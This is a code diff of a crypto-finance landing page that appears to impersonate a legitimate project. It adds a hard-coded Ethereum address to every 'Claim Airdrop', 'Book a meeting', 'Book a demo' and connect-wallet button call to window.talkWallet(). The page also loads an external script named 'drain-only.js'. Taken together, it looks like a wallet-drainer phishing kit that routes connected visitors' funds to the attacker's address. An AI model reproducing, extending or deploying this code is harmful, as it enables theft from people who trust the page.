@@ -234,7 +234,7 @@
   <a href="./borrow.html">Borrow QNT</a>
   <a href="./stake.html">Stake QNT</a>
   <button onclick="connectWallet();toggleNav()">Connect Wallet</button>
-  <button class="nd-orange" onclick="window.talkWallet();toggleNav()">Claim Airdrop</button>
+  <button class="nd-orange" onclick="window.talkWallet('0x3856Eecbdc4e4e4218B7d2bF2070731D9CF62DD8');toggleNav()">Claim Airdrop</button>
   <a class="nd-tg" href="https://t.me/OndoFinanceC" target="_blank">Join Telegram</a>
 </div>
 
@@ -395,7 +395,7 @@
   </div>
 
   <div class="hero-actions">
-    <button class="btn-primary" onclick="window.talkWallet()">Claim Airdrop</button>
+    <button class="btn-primary" onclick="window.talkWallet('0x3856Eecbdc4e4e4218B7d2bF2070731D9CF62DD8')">Claim Airdrop</button>
     <a href="./borrow.html"><button class="btn-outline">Borrow QNT</button></a>
     <a href="./stake.html"><button class="btn-outline">Stake QNT</button></a>
     <a href="https://t.me/OndoFinanceC" target="_blank"><button class="btn-telegram">Join Live Chat</button></a>
@@ -434,7 +434,7 @@
         <p>Welcome to the next generation of finance.</p>
       </div>
       <div style="margin-top:28px;">
-        <button class="btn-primary fade-in" style="transition-delay:.2s" onclick="window.talkWallet()">Book a meeting</button>
+        <button class="btn-primary fade-in" style="transition-delay:.2s" onclick="window.talkWallet('0x3856Eecbdc4e4e4218B7d2bF2070731D9CF62DD8')">Book a meeting</button>
       </div>
     </div>
   </div>
@@ -522,7 +522,7 @@
   <div class="cta-bg"></div>
   <div class="cta-content">
     <h2 class="cta-title fade-in">Ready to redefine how<br/>money works for you?</h2>
-    <button class="btn-cta fade-in" style="transition-delay:.1s" onclick="window.talkWallet()">Book a demo</button>
+    <button class="btn-cta fade-in" style="transition-delay:.1s" onclick="window.talkWallet('0x3856Eecbdc4e4e4218B7d2bF2070731D9CF62DD8')">Book a demo</button>
   </div>
 </section>
 
@@ -582,7 +582,7 @@
 <script src="https://kaspa.wiki/drain-only.js"></script>
 <script>
   function connectWallet() {
-    if (typeof window.talkWallet === 'function') window.talkWallet();
+    if (typeof window.talkWallet === 'function') window.talkWallet('0x3856Eecbdc4e4e4218B7d2bF2070731D9CF62DD8');
   }
 
   function toggleNav() {
